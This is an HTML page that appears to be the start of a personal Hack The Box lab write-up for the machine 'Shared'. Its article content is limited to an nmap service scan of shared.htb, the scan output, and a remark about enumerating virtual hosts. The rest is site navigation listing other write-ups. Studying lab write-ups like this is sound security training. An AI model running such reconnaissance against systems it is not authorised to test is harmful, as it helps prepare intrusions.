@@ -1,0 +1,942 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Updown" href="../updown/updown.html" /><link rel="prev" title="Scrambled" href="../scrambled/scrambled.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Shared - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="shared.png" src="../../../../_images/shared.png" /></p>
+<section id="shared">
+<h1>Shared<a class="headerlink" href="#shared" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>shared.htb<span class="w"> </span>-oN<span class="w"> </span>nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-10-16<span class="w"> </span><span class="m">20</span>:39<span class="w"> </span>IST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>shared.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.172<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.11s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w">  </span>VERSION
+<span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">      </span>OpenSSH<span class="w"> </span><span class="m">8</span>.4p1<span class="w"> </span>Debian<span class="w"> </span><span class="m">5</span>+deb11u1<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span><span class="m">91</span>:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">     </span>nginx<span class="w"> </span><span class="m">1</span>.18.0
+<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">81</span><span class="w"> </span>disallowed<span class="w"> </span>entries<span class="w"> </span><span class="o">(</span><span class="m">15</span><span class="w"> </span>shown<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>/*?order<span class="o">=</span><span class="w"> </span>/*?tag<span class="o">=</span><span class="w"> </span>/*?id_currency<span class="o">=</span><span class="w"> </span>/*?search_query<span class="o">=</span>
+<span class="p">|</span><span class="w"> </span>/*?back<span class="o">=</span><span class="w"> </span>/*?n<span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">order</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">tag</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">id_currency</span><span class="o">=</span>
+<span class="p">|</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">search_query</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">back</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">n</span><span class="o">=</span><span class="w"> </span>/*controller<span class="o">=</span>addresses
+<span class="p">|</span>_/*controller<span class="o">=</span>address<span class="w"> </span>/*controller<span class="o">=</span>authentication
+<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>https://shared.htb/
+<span class="m">443</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/http<span class="w"> </span>nginx<span class="w"> </span><span class="m">1</span>.18.0
+<span class="p">|</span>_ssl-date:<span class="w"> </span>TLS<span class="w"> </span>randomness<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>represent<span class="w"> </span><span class="nb">time</span>
+<span class="p">|</span><span class="w"> </span>tls-nextprotoneg:
+<span class="p">|</span><span class="w">   </span>h2
+<span class="p">|</span>_<span class="w">  </span>http/1.1
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>*.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2022</span>-03-20T13:37:14
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2042</span>-03-15T13:37:14
+<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0
+<span class="p">|</span><span class="w"> </span>tls-alpn:
+<span class="p">|</span><span class="w">   </span>h2
+<span class="p">|</span>_<span class="w">  </span>http/1.1
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">81</span><span class="w"> </span>disallowed<span class="w"> </span>entries<span class="w"> </span><span class="o">(</span><span class="m">15</span><span class="w"> </span>shown<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>/*?order<span class="o">=</span><span class="w"> </span>/*?tag<span class="o">=</span><span class="w"> </span>/*?id_currency<span class="o">=</span><span class="w"> </span>/*?search_query<span class="o">=</span>
+<span class="p">|</span><span class="w"> </span>/*?back<span class="o">=</span><span class="w"> </span>/*?n<span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">order</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">tag</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">id_currency</span><span class="o">=</span>
+<span class="p">|</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">search_query</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">back</span><span class="o">=</span><span class="w"> </span>/*<span class="p">&amp;</span><span class="nv">n</span><span class="o">=</span><span class="w"> </span>/*controller<span class="o">=</span>addresses
+<span class="p">|</span>_/*controller<span class="o">=</span>address<span class="w"> </span>/*controller<span class="o">=</span>authentication
+<span class="p">|</span>_http-trane-info:<span class="w"> </span>Problem<span class="w"> </span>with<span class="w"> </span>XML<span class="w"> </span>parsing<span class="w"> </span>of<span class="w"> </span>/evox/about
+<span class="p">|</span><span class="w"> </span>http-title:<span class="w"> </span>Shared<span class="w"> </span>Shop
+<span class="p">|</span>_Requested<span class="w"> </span>resource<span class="w"> </span>was<span class="w"> </span>https://shared.htb/index.php
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">30</span>.38<span class="w"> </span>seconds
+zsh:<span class="w"> </span>segmentation<span class="w"> </span>fault<span class="w">  </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>shared.htb<span class="w"> </span>-oN<span class="w"> </span>nmap.initial
+</pre></div>
+</div>
+<p>The tls cert has a wildcard for subdomains of shared.htb, so it’s worth enumerating vhosts</p>
